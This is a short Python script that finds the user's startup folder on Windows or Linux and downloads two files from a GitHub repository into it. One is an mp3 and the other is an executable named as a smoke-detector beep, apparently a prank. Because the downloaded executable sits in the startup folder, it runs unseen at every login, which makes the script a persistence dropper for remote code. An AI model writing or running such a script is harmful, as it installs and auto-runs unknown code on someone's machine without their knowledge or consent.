import os
import requests


def download_file(url, destination_folder):
    try:
        
        response = requests.get(url, allow_redirects=True)
        response.raise_for_status()  # Raise an exception for HTTP errors
        
       
        filename = os.path.basename(url)
        destination = os.path.join(destination_folder, filename)
        
        
        with open(destination, 'wb') as file:
            file.write(response.content)
        
       
        print(f"Downloaded {filename} to {destination}")
    except Exception as e:
        
        print(f"Failed to download {url}: {e}")


if os.name == 'nt':  
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
elif os.name == 'posix': 
    startup_folder = os.path.expanduser('~/.config/autostart')
else:
    raise OSError("Unsupported operating system")


if not os.path.exists(startup_folder):
    os.makedirs(startup_folder)


file_urls = [
    'https://github.com/NthPhantom10/script-things/raw/main/smoke-detector-beep.mp3',
    'https://github.com/NthPhantom10/script-things/raw/main/smoke%20detector%20beep%20part%202.exe'
]


for url in file_urls:
    download_file(url, startup_folder)
